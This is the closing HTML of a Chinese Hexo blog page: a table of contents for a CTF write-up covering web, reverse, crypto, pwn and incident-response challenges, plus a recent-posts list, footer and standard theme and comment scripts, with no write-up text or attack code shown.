toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SignIn"><span class="toc-number">1.1.</span> <span class="toc-text">SignIn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#try"><span class="toc-number">1.2.</span> <span class="toc-text">try</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#QR-code%EF%BC%9F"><span class="toc-number">1.3.</span> <span class="toc-text">QR_code？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BB%B4%E6%BB%B4%E5%97%92%E5%97%92"><span class="toc-number">1.4.</span> <span class="toc-text">滴滴嗒嗒</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="toc-number">1.5.</span> <span class="toc-text">攻击日志分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B2%99%E6%BB%A9%EF%BC%8C%E6%B5%B7%E6%B4%8B%EF%BC%8C%E5%A4%A7%E5%86%92%E9%99%A9%EF%BC%81"><span class="toc-number">1.6.</span> <span class="toc-text">沙滩，海洋，大冒险！</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94"><span class="toc-number">2.</span> <span class="toc-text">应急响应</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-1%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6"><span class="toc-number">2.1.</span> <span class="toc-text">应急响应-1钓鱼邮件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-2%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">2.2.</span> <span class="toc-text">应急响应-2一句话木马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-3%E5%90%8E%E9%97%A8%E7%94%A8%E6%88%B7"><span class="toc-number">2.3.</span> <span class="toc-text">应急响应-3后门用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-4%E7%97%85%E6%AF%92%E6%96%87%E4%BB%B6"><span class="toc-number">2.4.</span> <span class="toc-text">应急响应-4病毒文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-5%E5%8B%92%E7%B4%A2%E9%92%B1%E5%8C%85"><span class="toc-number">2.5.</span> <span class="toc-text">应急响应-5勒索钱包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.6.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">3.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2048Game"><span class="toc-number">3.1.</span> <span class="toc-text">2048Game</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EZ-PHP"><span class="toc-number">3.2.</span> <span class="toc-text">EZ_PHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8B%AC%E5%AD%A4%E4%B9%9D%E5%89%91"><span class="toc-number">3.3.</span> <span class="toc-text">独孤九剑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unser"><span class="toc-number">3.4.</span> <span class="toc-text">unser</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8CTF%E9%87%8C%E6%89%93ACM"><span class="toc-number">3.5.</span> <span class="toc-text">重生之我在CTF里打ACM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Jenkins"><span class="toc-number">3.6.</span> <span class="toc-text">Jenkins</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-upload"><span class="toc-number">3.7.</span> <span class="toc-text">ez_upload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse"><span class="toc-number">4.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FlagChecker"><span class="toc-number">4.1.</span> <span class="toc-text">FlagChecker</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#maze"><span class="toc-number">4.2.</span> <span class="toc-text">maze</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Try-to-find-me"><span class="toc-number">4.3.</span> <span class="toc-text">Try to find me</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E7%9B%B8%E4%B9%8B%E5%8A%9B"><span class="toc-number">4.4.</span> <span class="toc-text">三相之力</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JavaScript"><span class="toc-number">4.5.</span> <span class="toc-text">JavaScript</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">5.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#private-key"><span class="toc-number">5.1.</span> <span class="toc-text">private key</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%BF%83%E8%A7%A3%E6%96%B9%E7%A8%8B"><span class="toc-number">5.2.</span> <span class="toc-text">开心解方程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezRSA"><span class="toc-number">5.3.</span> <span class="toc-text">ezRSA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#share"><span class="toc-number">5.4.</span> <span class="toc-text">share</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LWE"><span class="toc-number">5.5.</span> <span class="toc-text">LWE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-number">6.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Baby-Canary"><span class="toc-number">6.1.</span> <span class="toc-text">Baby Canary</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-shellcode"><span class="toc-number">6.2.</span> <span class="toc-text">ez_shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mid-shellcode"><span class="toc-number">6.3.</span> <span class="toc-text">mid_shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#format-string"><span class="toc-number">6.4.</span> <span class="toc-text">format_string</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/10fa73ae.html" title="VNCTF2025-WP">VNCTF2025-WP</a><time datetime="2025-02-10T05:59:00.000Z" title="发表于 2025-02-10 13:59:00">2025-02-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/c2cf88b8.html" title="2024年度总结"><img src="/img/loading.gif" data-original="/images/f0adcc3244dd7fd5358698e9945ac7e8.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2024年度总结"/></a><div class="content"><a class="title" href="/post/c2cf88b8.html" title="2024年度总结">2024年度总结</a><time datetime="2025-01-29T06:02:27.000Z" title="发表于 2025-01-29 14:02:27">2025-01-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/27dd2185.html" title="XAUTCTF2024NewCupPartr2暨2025冬季赛-官方题解">XAUTCTF2024NewCupPartr2暨2025冬季赛-官方题解</a><time datetime="2025-01-22T09:41:31.000Z" title="发表于 2025-01-22 17:41:31">2025-01-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/31fded05.html" title="Ollama+CodeGeeX+VScode的本地LLM部署方案">Ollama+CodeGeeX+VScode的本地LLM部署方案</a><time datetime="2024-12-04T12:50:05.000Z" title="发表于 2024-12-04 20:50:05">2024-12-04</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/5d53a887.html" title="简单盘点Linux">简单盘点Linux</a><time datetime="2024-11-25T05:03:36.000Z" title="发表于 2024-11-25 13:03:36">2024-11-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/4fcd1189.html" title="XAUTCTF2024选拔赛部分WP----非官方集合版">XAUTCTF2024选拔赛部分WP----非官方集合版</a><time datetime="2024-11-24T00:59:37.000Z" title="发表于 2024-11-24 08:59:37">2024-11-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/9662863a.html" title="Frp+Proxifier反向代理实现内网穿透">Frp+Proxifier反向代理实现内网穿透</a><time datetime="2024-10-27T16:46:38.000Z" title="发表于 2024-10-28 00:46:38">2024-10-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/45ab8fde.html" title="WP书写指南">WP书写指南</a><time datetime="2024-10-12T13:09:05.000Z" title="发表于 2024-10-12 21:09:05">2024-10-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/3dd951cb.html" title="QQBot用户使用手册V1.0">QQBot用户使用手册V1.0</a><time datetime="2024-10-06T17:19:15.000Z" title="发表于 2024-10-07 01:19:15">2024-10-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/d79b03c7.html" title="QQBot管理员手册V1.0">QQBot管理员手册V1.0</a><time datetime="2024-10-06T16:12:27.000Z" title="发表于 2024-10-07 00:12:27">2024-10-07</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2025 By BR</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><a href="https://beian.miit.gov.cn/" target="_blank">陕ICP备2023014186号-2</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button><button id="go-down" type="button" title="直达底部" onclick="btf.scrollToDest(document.body.scrollHeight, 500)"><i class="fas fa-arrow-down"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
  const option = null

  const getCount = () => {
    const countELement = document.getElementById('twikoo-count')
    if(!countELement) return
    twikoo.getCommentsCount({
      envId: 'https://twikoo.yzbrh.top',
      region: '',
      urls: [window.location.pathname],
      includeReply: false
    }).then(res => {
      countELement.textContent = res[0].count
    }).catch(err => {
      console.error(err)
    })
  }

  const init = (el = document, path = location.pathname) => {
    twikoo.init({
      el: el.querySelector('#twikoo-wrap'),
      envId: 'https://twikoo.yzbrh.top',
      region: '',
      onCommentLoaded: () => {
        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
      },
      ...option,
      path: isShuoshuo ? path : (option && option.path) || path
    })

    

    isShuoshuo && (window.shuoshuoComment.destroyTwikoo = () => {
      if (el.children.length) {
        el.innerHTML = ''
        el.classList.add('no-comment')
      }
    })
  }

  const loadTwikoo = (el, path) => {
    if (typeof twikoo === 'object') setTimeout(() => init(el, path), 0)
    else btf.getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(() => init(el, path))
  }

  if (isShuoshuo) {
    'Twikoo' === 'Twikoo'
      ? window.shuoshuoComment = { loadComment: loadTwikoo }
      : window.loadOtherComment = loadTwikoo
    return
  }

  if ('Twikoo' === 'Twikoo' || !false) {
    if (false) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else loadTwikoo()
  } else {
    window.loadOtherComment = loadTwikoo
  }
})()</script></div><canvas id="universe"></canvas><script defer src="/js/universe.js"></script><div class="aplayer no-destroy" data-id="12305505573" data-server="netease" data-type="playlist" data-fixed="true" data-autoplay="false" data-order="random" data-mutex="true"> </div><script defer src="/js/sweetalert2.all.js"></script><script defer src="/js/lunar.js"></script><script defer src="/js/day.js"></script><script async src="/js/console.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="150" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div>
        <style>
            [bg-lazy] {
                background-image: none !important;
                background-color: #eee !important;
            }
        </style>
        <script>
            window.imageLazyLoadSetting = {
                isSPA: false,
                preloadRatio: 1,
                processImages: null,
            };
        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z\d\-\.\+]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(t.test(e.href)||r.test(e.href))&&(e.href=a.dataset.original)})});</script><script>(r=>{r.imageLazyLoadSetting.processImages=t;var a=r.imageLazyLoadSetting.isSPA,o=r.imageLazyLoadSetting.preloadRatio||1,d=i();function i(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(t){(a||t)&&(d=i());for(var e,n=0;n<d.length;n++)0<=(e=(e=d[n]).getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(r.innerHeight*o||document.documentElement.clientHeight*o)&&(()=>{var t,e,a,o,i=d[n];e=function(){d=d.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).dataset.loaded||(t.hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(a=new Image,o=t.getAttribute("data-original"),a.onload=function(){t.src=o,t.removeAttribute("data-original"),t.setAttribute("data-loaded",!0),e&&e()},a.onerror=function(){t.removeAttribute("data-original"),t.setAttribute("data-loaded",!1),t.src=o},t.src!==o&&(a.src=o)))})()}function e(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",e),r.addEventListener("resize",e),r.addEventListener("orientationchange",e)})(this);</script></body></html>